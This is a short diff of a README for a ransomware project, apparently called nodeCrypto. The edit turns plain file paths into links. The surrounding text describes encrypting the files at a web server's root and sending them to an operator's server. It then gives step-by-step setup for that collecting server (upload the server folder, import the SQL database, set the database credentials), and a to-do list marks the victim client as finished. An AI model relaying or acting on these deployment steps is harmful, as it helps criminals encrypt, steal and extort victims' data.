@@ -13,10 +13,9 @@ Once your configuration is complete, you can start the ransomware.
 The files at the root of the web server will encrypt and send to the server.  
 
 **Install server**  
-Upload all file of server/ folder  on your webserver.
-Create a sql database and import sql/nodeCrypto.sql.
-Edit server/libs/db.php and add your SQL ID
-
+Upload all file of [server/](https://github.com/atmoner/nodeCrypto/tree/master/server) folder  on your webserver.  
+Create a sql database and import [sql/nodeCrypto.sql](https://github.com/atmoner/nodeCrypto/blob/master/sql/nodeCrypto.sql)  
+Edit [server/libs/db.php](https://github.com/atmoner/nodeCrypto/blob/master/server/libs/db.php) and add your SQL ID.  
 
 **To Do**  
  - [x] Client (victim)
